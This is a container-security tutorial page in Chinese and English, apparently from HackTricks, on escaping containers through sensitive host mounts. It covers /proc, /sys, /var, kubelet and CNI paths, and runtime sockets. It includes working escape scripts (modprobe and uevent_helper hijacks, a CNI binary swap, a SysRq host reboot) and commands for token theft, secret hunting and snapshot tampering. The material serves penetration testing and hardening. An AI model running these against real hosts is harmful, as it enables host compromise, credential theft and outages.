# Sensitive Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## Overview

Host mounts 是最重要的 practical container-escape surface 之一，因为它们常常会把精心隔离的 process view 直接折叠回对 host resources 的可见性。危险情况并不只限于 `/`。对 `/proc`、`/sys`、`/var`、runtime sockets、kubelet-managed state，或与 device 相关的 paths 的 bind mounts，都可能暴露 kernel controls、credentials、邻近 container filesystem，以及 runtime management interfaces。

这个页面之所以独立于各个单独的 protection pages，是因为 abuse model 是 cross-cutting 的。一个可写的 host mount 之所以危险，部分原因在于 mount namespaces，部分原因在于 user namespaces，部分原因在于 AppArmor 或 SELinux coverage，部分原因则取决于到底暴露了哪个具体的 host path。把它作为单独主题来处理，会让 attack surface 更容易推理。

## `/proc` Exposure

procfs 同时包含普通的 process information 和高影响力的 kernel control interfaces。因此，像 `-v /proc:/host/proc` 这样的 bind mount，或者暴露了意外可写 proc entries 的 container view，都可能导致 information disclosure、denial of service，或直接的 host code execution。

高价值的 procfs paths 包括：

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

先检查哪些高价值 procfs entries 是可见或可写的：
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
这些路径之所以有意思，原因各不相同。`core_pattern`、`modprobe` 和 `binfmt_misc` 在可写时可能变成 host code-execution 路径。`kallsyms`、`kmsg`、`kcore` 和 `config.gz` 是 kernel exploitation 很强的侦察来源。`sched_debug` 和 `mountinfo` 会揭示 process、cgroup 和 filesystem 上下文，这有助于从 container 内重建 host 布局。

每个路径的实际价值不同，如果把它们都当成同样的影响来处理，会让 triage 更困难：

- `/proc/sys/kernel/core_pattern`
如果可写，这是影响最高的 procfs 路径之一，因为 kernel 会在 crash 后执行一个 pipe handler。一个能够把 `core_pattern` 指向存放在其 overlay 或已挂载 host path 中 payload 的 container，通常可以获得 host code execution。另见 [read-only-paths.md](protections/read-only-paths.md) 中的专门示例。
- `/proc/sys/kernel/modprobe`
这个路径控制 kernel 在需要调用 module-loading logic 时使用的 userspace helper。如果可以从 container 中写入，并且在 host context 中被解释，它可以变成另一个 host code-execution primitive。它尤其适合与触发 helper path 的方式组合使用。
- `/proc/sys/vm/panic_on_oom`
这通常不是一个干净的 escape primitive，但它可以把 memory pressure 转化为整个 host 范围的 denial of service，因为它会把 OOM 条件变成 kernel panic 行为。
- `/proc/sys/fs/binfmt_misc`
如果 registration interface 可写，攻击者可以为选定的 magic value 注册 handler，并在执行匹配文件时获得 host-context execution。
- `/proc/config.gz`
对 kernel exploit triage 很有用。它无需 host package metadata 就能帮助判断启用了哪些 subsystem、mitigation 和可选 kernel feature。
- `/proc/sysrq-trigger`
主要是 denial-of-service 路径，但非常严重。它可以立即重启、panic 或以其他方式干扰 host。
- `/proc/kmsg`
会暴露 kernel ring buffer messages。可用于 host fingerprinting、crash analysis，在某些环境下还可泄漏对 kernel exploitation 有帮助的信息。
- `/proc/kallsyms`
如果可读，它很有价值，因为它暴露了导出的 kernel symbol 信息，并可能帮助在 kernel exploit development 期间绕过 address randomization 假设。
- `/proc/[pid]/mem`
这是一个直接的 process-memory 接口。如果目标进程在必要的 ptrace-style 条件下可达，它可能允许读取或修改另一个进程的内存。实际影响在很大程度上取决于 credentials、`hidepid`、Yama 和 ptrace restrictions，因此它是一个强大但有条件的路径。
- `/proc/kcore`
暴露的是类似 core-image 的系统内存视图。这个文件非常大，而且不好用，但如果它在有意义上可读，说明 host memory surface 暴露得很差。
- `/proc/kmem` 和 `/proc/mem`
历史上影响很高的原始内存接口。在许多现代系统上它们已被禁用或高度限制，但如果存在且可用，就应被视为严重发现。
- `/proc/sched_debug`
会泄漏 scheduling 和 task 信息，即使其他 process 视图看起来比预期更干净，它也可能暴露 host process identities。
- `/proc/[pid]/mountinfo`
对于重建 container 在 host 上的真实位置、哪些路径由 overlay-backed、以及某个可写 mount 对应的是 host content 还是仅仅 container layer，非常有用。

如果 `/proc/[pid]/mountinfo` 或 overlay details 可读，就用它们来恢复 container filesystem 的 host path：
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
这些命令很有用，因为许多 host-execution 技巧需要将容器内的某个路径转换为从主机视角对应的路径。

### 完整示例：`modprobe` Helper Path Abuse

如果 `/proc/sys/kernel/modprobe` 可从容器中写入，并且 helper path 会在主机上下文中被解释，那么它可以被重定向到攻击者控制的 payload：
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
精确的触发条件取决于目标和 kernel 行为，但关键点是，可写的 helper path 可以将未来的 kernel helper 调用重定向到攻击者控制的 host-path 内容。

### Full Example: Kernel Recon With `kallsyms`, `kmsg`, And `config.gz`

如果目标是评估可利用性，而不是立即逃逸：
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
这些命令有助于回答：是否能看到有用的 symbol 信息，最近的 kernel 消息是否透露了有趣的状态，以及编译进了哪些 kernel features 或 mitigations。其影响通常不是直接 escape，但它可以显著缩短 kernel-vulnerability triage 时间。

### Full Example: SysRq Host Reboot

如果 `/proc/sysrq-trigger` 是可写的并且能到达 host 视图：
```bash
echo b > /proc/sysrq-trigger
```
效果是立即重启 host。这不是一个微妙的例子，但它清楚地说明了 procfs exposure 可能比 information disclosure 严重得多。

## `/sys` Exposure

sysfs 暴露了大量 kernel 和 device 状态。有些 sysfs paths 主要用于 fingerprinting，而另一些则可能影响 helper 执行、device 行为、security-module 配置或 firmware 状态。

高价值的 sysfs paths 包括：

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

这些 paths 之所以重要，原因各不相同。`/sys/class/thermal` 可能影响 thermal-management 行为，因此在暴露不当的环境中会影响 host stability。`/sys/kernel/vmcoreinfo` 可能泄露 crash-dump 和 kernel-layout 信息，有助于低级别 host fingerprinting。`/sys/kernel/security` 是 Linux Security Modules 使用的 `securityfs` interface，因此对它的意外访问可能暴露或修改 MAC 相关状态。EFI variable paths 可能影响 firmware-backed boot settings，因此比普通配置文件严重得多。`/sys/kernel/debug` 下的 `debugfs` 尤其危险，因为它本质上是面向开发者的 interface，与 hardened production-facing kernel APIs 相比，安全预期要低得多。

这些 paths 的有用检查命令如下：
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
这些命令之所以有意思：

- `/sys/kernel/security` 可能会暴露 AppArmor、SELinux 或其他 LSM 表面是否以一种本应仅限 host 可见的方式被暴露出来。
- `/sys/kernel/debug` 往往是这一组里最令人担忧的发现。若 `debugfs` 已挂载且可读或可写，意味着会有一个面向 kernel 的巨大攻击面，其具体风险取决于已启用的 debug 节点。
- EFI variable exposure 较少见，但如果存在，影响很大，因为它接触的是 firmware-backed settings，而不是普通的运行时文件。
- `/sys/class/thermal` 主要与 host 稳定性和硬件交互相关，而不是那种干净利落的 shell-style escape。
- `/sys/kernel/vmcoreinfo` 主要是 host-fingerprinting 和 crash-analysis 的来源，有助于理解底层 kernel 状态。

### Full Example: `uevent_helper`

如果 `/sys/kernel/uevent_helper` 可写，kernel 可能会在触发 `uevent` 时执行一个由 attacker 控制的 helper：
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
之所以有效，是因为 helper path 是从主机的视角来解释的。一旦被触发，helper 会在主机上下文中运行，而不是在当前 container 内部。

## `/var` 暴露

将主机的 `/var` 挂载到 container 中常常被低估，因为它看起来没有挂载 `/` 那么夸张。实际上，它足以访问 runtime sockets、container snapshot 目录、kubelet 管理的 pod volumes、projected service-account tokens，以及相邻应用的 filesystem。在现代节点上，`/var` 往往才是真正存放最有运维价值的 container 状态的地方。

### Kubernetes 示例

一个带有 `hostPath: /var` 的 pod 通常可以读取其他 pods 的 projected tokens 和 overlay snapshot 内容：
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
这些命令很有用，因为它们可以回答该挂载暴露的只是普通的应用数据，还是高影响力的集群凭证。一个可读的 service-account token 可能会立刻把本地代码执行转变为 Kubernetes API 访问。

如果 token 存在，不要在发现 token 后就停下，而是验证它能访问什么：
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
这里的影响可能远不止本地节点访问。一个具有广泛 RBAC 的 token 可以把挂载的 `/var` 变成整个集群范围的 compromise。

### Docker And containerd Example

在 Docker 主机上，相关数据通常位于 `/var/lib/docker`，而在基于 containerd 的 Kubernetes 节点上，它可能位于 `/var/lib/containerd` 或特定 snapshotter 的路径下：
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
如果挂载的 `/var` 暴露了另一个 workload 的可写 snapshot 内容，攻击者可能能够修改 application 文件、放置 web content，或更改 startup scripts，而无需触碰当前 container configuration。

一旦发现可写的 snapshot content，具体的滥用思路包括：
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
这些 commands 很有用，因为它们展示了挂载的 `/var` 的三大主要影响类别：application tampering、secret recovery 和 lateral movement 到相邻 workloads。

## Kubelet State, Plugins, And CNI Paths

挂载 `/var/lib/kubelet`、`/opt/cni/bin` 或 `/etc/cni/net.d` 通常会通过 privileged DaemonSets、CNI agents、CSI node plugins、GPU operators 和 storage helpers 暴露出来。这些挂载很容易被当作“node plumbing”忽略，但它们直接位于新 pods 的执行路径中，而且经常包含 kubelet credentials、projected secrets、registration sockets，以及可执行的 host-side plugin binaries。

高价值目标包括：

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

有用的 review commands 是：
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
为什么这些路径很重要：

- `/var/lib/kubelet/pki` 可能暴露 kubelet client certificates 和其他 node-local credentials；根据集群设计，这些凭证有时可以在 API server 或 kubelet-facing TLS endpoints 上复用。
- `/var/lib/kubelet/pods` 通常包含投影的 service-account tokens，以及同一节点上相邻 pods 挂载的 Secrets。
- `/var/lib/kubelet/pod-resources/kubelet.sock` 主要是一个 reconnaissance surface，但非常有用：它会显示哪些 pods 和 containers 当前占用了 GPUs、hugepages、SR-IOV devices，以及其他稀缺的 node-local resources。
- `/var/lib/kubelet/device-plugins`、`/var/lib/kubelet/plugins` 和 `/var/lib/kubelet/plugins_registry` 会暴露已安装的哪些 CSI、DRA 和 device plugins，以及 kubelet 预期会与哪些 sockets 通信。如果这些目录是可写而不只是可读，那么这个发现就严重得多。
- `/opt/cni/bin` 和 `/etc/cni/net.d` 直接位于 pod-network setup path 上。对它们拥有可写访问权限，往往意味着一种延迟的 host-execution primitive，而不只是配置泄露。

### Full Example: Writable `/opt/cni/bin`

如果 host CNI binary 目录以读写方式挂载，那么替换一个 plugin 可能就足以在 kubelet 下次在该节点创建 pod sandbox 时获得 host execution：
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
这不像挂载的 `docker.sock` 那样直接，但在被入侵的 Kubernetes 基础设施 pod 中，这通常更现实。重点是，被修改的二进制文件随后会由主机网络 setup flow 执行，而不是由当前 container 执行。


## Runtime Sockets

Sensitive host mounts often include runtime sockets rather than full directories. These are so important that they deserve explicit repetition here:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
见 [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) 了解在挂载其中一个 socket 后的完整利用流程。

作为一个快速的初始交互模式：
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
如果其中一个成功，从“mounted socket”到“启动一个权限更高的 sibling container”的路径，通常比任何 kernel breakout 路径要短得多。

## Mount-Related CVEs

Host mounts 也会与 runtime 漏洞交叉。重要的近期示例包括：

- `CVE-2024-21626` in `runc`，其中泄露的 directory file descriptor 可能把 working directory 放到 host filesystem 上。
- `CVE-2024-23651`、`CVE-2024-23652` 和 `CVE-2024-23653` in BuildKit，其中恶意 Dockerfiles、frontends 和 `RUN --mount` 流程可能在构建期间重新引入 host file access、deletion 或 elevated privileges。
- `CVE-2024-1753` in Buildah 和 Podman build flows，其中构建期间精心构造的 bind mounts 可能暴露可读写的 `/`。
- `CVE-2025-47290` in `containerd` 2.1.0，其中 image unpack 期间的 TOCTOU 可能让一个特制 image 在 pull 期间修改 host filesystem。

这些 CVEs 在这里很重要，因为它们表明 mount handling 不仅仅是 operator configuration 的问题。runtime 本身也可能引入基于 mount 的 escape 条件。

## Checks

Use these commands to locate the highest-value mount exposures quickly:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
这里有几点值得注意：

- Host root、`/proc`、`/sys`、`/var` 以及 runtime sockets 都是高优先级发现项。
- 可写的 proc/sys 条目通常意味着该 mount 暴露的是 host 级别的 kernel 控制，而不是安全的 container 视图。
- 挂载的 `/var` 路径不仅要检查 filesystem，还要检查 credential 和相邻 workload。
- Kubelet state directories 和 CNI/plugin 路径应与 runtime sockets 享有同等优先级，因为它们通常直接位于节点的 pod 创建和 credential 分发路径上。

## References

- [Local Files And Paths Used By The Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [cilium-agent container can access the host via `hostPath` mount](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
